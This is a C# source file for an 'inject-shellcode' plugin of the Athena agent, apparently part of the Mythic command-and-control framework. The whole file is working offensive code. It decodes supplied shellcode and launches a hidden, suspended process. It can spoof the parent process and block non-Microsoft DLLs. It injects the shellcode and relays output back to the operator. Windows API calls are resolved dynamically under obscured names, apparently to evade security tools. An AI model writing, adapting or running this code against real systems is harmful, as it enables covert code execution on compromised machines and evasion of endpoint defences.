using Athena.Commands.Models;
using Athena.Utilities;
using shellcode_inject.Techniques;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using shellcode_inject;
using System.Diagnostics;
using Athena.Commands;
//using static shellcode_inject.Native;

namespace Plugins
{
    public class InjectShellcode : AthenaPlugin
    {
        DynamicHandler.DynamicMakePipe dlgCretPipe = (DynamicHandler.DynamicMakePipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtPipe, typeof(DynamicHandler.DynamicMakePipe));
        DynamicHandler.DynamicSetHndlInfo dlgSetHandle = (DynamicHandler.DynamicSetHndlInfo)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.SetHanldeInfo, typeof(DynamicHandler.DynamicSetHndlInfo));
        DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrlist, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
        DynamicHandler.DynamicCreateProc dlgCretProc = (DynamicHandler.DynamicCreateProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CreateProc, typeof(DynamicHandler.DynamicCreateProc));
        DynamicHandler.DynamicWaitForSingleObject dlgWaitForObj = (DynamicHandler.DynamicWaitForSingleObject)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WitFrObj, typeof(DynamicHandler.DynamicWaitForSingleObject));
        DynamicHandler.DynamicOpenProc dlgOpenProc = (DynamicHandler.DynamicOpenProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.OpenProc, typeof(DynamicHandler.DynamicOpenProc));
        DynamicHandler.DynamicClsHndl dlgClsHndl = (DynamicHandler.DynamicClsHndl)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.ClsHndl, typeof(DynamicHandler.DynamicClsHndl));
        DynamicHandler.DynamicUpdteProcThredAttr dlgUpdProcThreadAttr = (DynamicHandler.DynamicUpdteProcThredAttr)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.UpdProcThrdAttr, typeof(DynamicHandler.DynamicUpdteProcThredAttr));
        DynamicHandler.DynamicPeekPipe dlgPeekPipe = (DynamicHandler.DynamicPeekPipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.PeekPipe, typeof(DynamicHandler.DynamicPeekPipe));
        DynamicHandler.DynamicDelProcThredAttrList dlgDelProcThrdAttrLst = (DynamicHandler.DynamicDelProcThredAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.DelProcThrAttrList, typeof(DynamicHandler.DynamicDelProcThredAttrList));
        DynamicHandler.DynamicDupeHndl dlgDupeHandle = (DynamicHandler.DynamicDupeHndl)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.DupeHandle, typeof(DynamicHandler.DynamicDupeHndl));

        //Todo: https://github.com/Kara-4search/MappingInjection_CSharp/blob/main/MappingInjection/MappingEarlyBirdInjection.cs
        public override string Name => "inject-shellcode";
        private ITechnique technique = new MVS();
        public override void Execute(Dictionary<string, string> args)
        {
            if (!string.IsNullOrEmpty(args["asm"]) && !string.IsNullOrEmpty(args["processName"]))
            {
                bool spoofParent = false;
                bool blockDlls = false;
                bool output = false;
                int parent = 0;

                byte[] b = Misc.Base64DecodeToByteArray(args["asm"]);

                if (!string.IsNullOrEmpty(args["parent"]) && int.TryParse(args["parent"], out parent))
                {
                    spoofParent = true;
                }

                if (bool.Parse(args["blockDlls"]))
                {
                    blockDlls = true;
                }

                if (bool.Parse(args["output"]))
                {
                    InjectNewProcessWithOutput(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"], output);
                }
                else
                {
                    InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"], output);
                }
            }
        }
        private bool InjectNewProcessWithOutput(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
        {
            //Credit for a lot of this code goes to #leoloobeek
            //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
            ManualResetEvent mre = new ManualResetEvent(false);
            var saHandles = new DynamicHandler.SECURITY_ATTRIBUTES()
            {
                nLength = Marshal.SizeOf(new DynamicHandler.SECURITY_ATTRIBUTES()),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero

            };

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;

            // Duplicate handle created just in case
            IntPtr hDupStdOutWrite = IntPtr.Zero;

            // Create the pipe and make sure read is not inheritable
            dlgCretPipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            //DynamicHandler.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            dlgSetHandle(hStdOutRead, DynamicHandler.HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new DynamicHandler.PROCESS_INFORMATION();
            var siEx = new DynamicHandler.STARTUPINFOEX();

            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            IntPtr lpValueProc = IntPtr.Zero;

            // Values will be overwritten if parentProcessId > 0
            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            var lpSize = new IntPtr();

            //var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
            var success = dlgInitProcThreadAttrLst(IntPtr.Zero, 2, 0, ref lpSize);
            if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
            {
                return false;
            }

            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);

            if (!success)
            {
                TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }

            if (blockDlls) // Block DLLs that aren't signed by Microsoft
            {
                AddBlockDLLs(ref siEx, ref lpSize);
            }

            if (spoofParent) // Spoof the parent process
            {
                AddSpoofParent(parentProcessId, ref siEx, ref lpValueProc, ref hStdOutWrite, ref hDupStdOutWrite);

            }

            siEx.StartupInfo.dwFlags = DynamicHandler.STARTF_USESHOWWINDOW | DynamicHandler.STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = DynamicHandler.SW_HIDE;

            var ps = new DynamicHandler.SECURITY_ATTRIBUTES();
            var ts = new DynamicHandler.SECURITY_ATTRIBUTES();
            ps.nLength = Marshal.SizeOf(ps);
            ts.nLength = Marshal.SizeOf(ts);

            bool ret = dlgCretProc(null, processName, ref ps, ref ts, true, DynamicHandler.EXTENDED_STARTUPINFO_PRESENT | DynamicHandler.CREATE_NO_WINDOW | DynamicHandler.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
            if (!ret)
            {
                TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }
            Console.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
            TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);

            method.Inject(sc, pInfo.hProcess);
            GetProcessOutput(lpValueProc, hStdOutRead, pInfo, siEx, task_id);
            
            CleanUp(lpValueProc, hStdOutRead, pInfo, siEx);

            return pInfo.hProcess != IntPtr.Zero;
        }
        private bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
        {
            //Credit for a lot of this code goes to #leoloobeek
            //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
            ManualResetEvent mre = new ManualResetEvent(false);
            var saHandles = new DynamicHandler.SECURITY_ATTRIBUTES()
            {
                nLength = Marshal.SizeOf(new DynamicHandler.SECURITY_ATTRIBUTES()),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero

            };

            // Duplicate handle created just in case
            IntPtr hDupStdOutWrite = IntPtr.Zero;

            var pInfo = new DynamicHandler.PROCESS_INFORMATION();
            var siEx = new DynamicHandler.STARTUPINFOEX();

            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            IntPtr lpValueProc = IntPtr.Zero;

            var lpSize = IntPtr.Zero;
            var success = StaticHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

            
            if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
            {
                return false;
            }

            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            success = StaticHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
            Console.WriteLine($"InitializeProcThreadAttributeList: {success}");
            if (!success)
            {
                TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }

            if (blockDlls) // Block DLLs that aren't signed by Microsoft
            {
                AddBlockDLLs(ref siEx, ref lpSize);
            }

            IntPtr tempHandle = IntPtr.Zero;

            if (spoofParent) // Spoof the parent process
            {
                AddSpoofParent(parentProcessId, ref siEx, ref lpValueProc, ref tempHandle, ref hDupStdOutWrite);

            }

            siEx.StartupInfo.dwFlags = DynamicHandler.STARTF_USESHOWWINDOW | DynamicHandler.STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = DynamicHandler.SW_HIDE;

            var ps = new DynamicHandler.SECURITY_ATTRIBUTES();
            var ts = new DynamicHandler.SECURITY_ATTRIBUTES();
            ps.nLength = Marshal.SizeOf(ps);
            ts.nLength = Marshal.SizeOf(ts);

            bool ret = dlgCretProc(null, processName, ref ps, ref ts, true, DynamicHandler.EXTENDED_STARTUPINFO_PRESENT | DynamicHandler.CREATE_NO_WINDOW | DynamicHandler.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
            if (!ret)
            {
                TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }

            TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);

            method.Inject(sc, pInfo.hProcess);
            Console.WriteLine("Waiting.");
            dlgWaitForObj(pInfo.hProcess, DynamicHandler.INFINITE);
            Console.WriteLine("Done Waiting.");
            CleanUp(lpValueProc, tempHandle, pInfo, siEx);

            return pInfo.hProcess != IntPtr.Zero;
        }
        private bool AddBlockDLLs(ref DynamicHandler.STARTUPINFOEX siEx, ref IntPtr lpSize)
        {
            //Initializes the specified list of attributes for process and thread creation.

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, DynamicHandler.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            // Add Microsoft-only DLL protection to our StartupInfoEx struct
            var success = Native.UpdateProcThreadAttribute(
            //var success = dlgUpdProcThreadAttr(
                siEx.lpAttributeList,
                0,
                (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                lpMitigationPolicy,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (!success)
            {
                Console.WriteLine("Not success.");
                return false;
            }
            return true;
        }
        private bool AddSpoofParent(int parentProcessId, ref DynamicHandler.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
        {
            //Get a handle to the parent process
            IntPtr parentHandle = dlgOpenProc(DynamicHandler.ProcessAccessFlags.CreateProcess | DynamicHandler.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);

            // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

            Marshal.WriteIntPtr(lpValueProc, parentHandle);

            //Updates the parent process ID
            bool success = StaticHandler.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValueProc,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (!success)
            {
                return false;
            }

            IntPtr hCurrent = Process.GetCurrentProcess().Handle;
            IntPtr hNewParent = dlgOpenProc(DynamicHandler.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);

            success = dlgDupeHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DynamicHandler.DUPLICATE_CLOSE_SOURCE | DynamicHandler.DUPLICATE_SAME_ACCESS);

            if (!success)
            {
                return false;
            }

            //The old handle would get overwritten if we're process spoofing, so we apply our backup handle here
            siEx.StartupInfo.hStdError = hDupStdOutWrite;
            siEx.StartupInfo.hStdOutput = hDupStdOutWrite;

            return true;
        }
        private bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, DynamicHandler.PROCESS_INFORMATION pInfo, DynamicHandler.STARTUPINFOEX siEx, string task_id)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            CancellationToken ct = cts.Token;
            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);

            while (!ct.IsCancellationRequested) //Loop to handle process output
            {
                if (dlgWaitForObj(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
                {
                    cts.Cancel();
                }

                char[] buf;
                int bytesRead;
                uint bytesToRead = 0;

                if(dlgPeekPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
                {
                    if(bytesToRead == 0) //We don't have any bytes to read
                    {
                        if (ct.IsCancellationRequested) //Check if we're supposed to exit
                        {
                            TaskResponseHandler.WriteLine("Finished.", task_id, true);
                            break;
                        }
                        else //Process just hasn't written anything yet
                        {
                            continue;
                        }
                    }
                    else if(bytesToRead > 4096) //We limit our buffer size to 4096 to not overwhelm the agent
                    {
                        bytesToRead = 4096;
                    }

                    buf = new char[bytesToRead]; //Allocate our new char buffer

                    try
                    {
                        bytesRead = reader.Read(buf, 0, buf.Length); //Read the char buffer into our previously allocated array

                        if (bytesRead > 0) //We read some bytes, lets return it to Mythic
                        {
                            Console.WriteLine(new string(buf));
                            TaskResponseHandler.Write(new string(buf), task_id, false);
                        }
                    }
                    catch
                    {
                        //nadda
                    }
                }
            }

            //Cancellation was requested, time for cleanup
            reader.Close(); //Close the allocated StreamReader

            if (!safeHandle.IsClosed) //Check if our handle is still open, if it is close it
            {
                safeHandle.Close();
            }

            if (hStdOutRead != IntPtr.Zero) //Close our allocated stdout handle if it exists
            {
                dlgClsHndl(hStdOutRead);
            }

            return true;
        }
        private void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, DynamicHandler.PROCESS_INFORMATION pInfo, DynamicHandler.STARTUPINFOEX siEx)
        {
            if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
            {

                StaticHandler.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                Marshal.FreeHGlobal(siEx.lpAttributeList);
            }

            Marshal.FreeHGlobal(lpValueProc);

            if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
            {
                //DynamicHandler.TerminateProcess(pInfo.hProcess, 0);
                dlgClsHndl(pInfo.hProcess);
            }

            if (pInfo.hThread != IntPtr.Zero)
            {
                dlgClsHndl(pInfo.hThread);
            }
        }
    }
}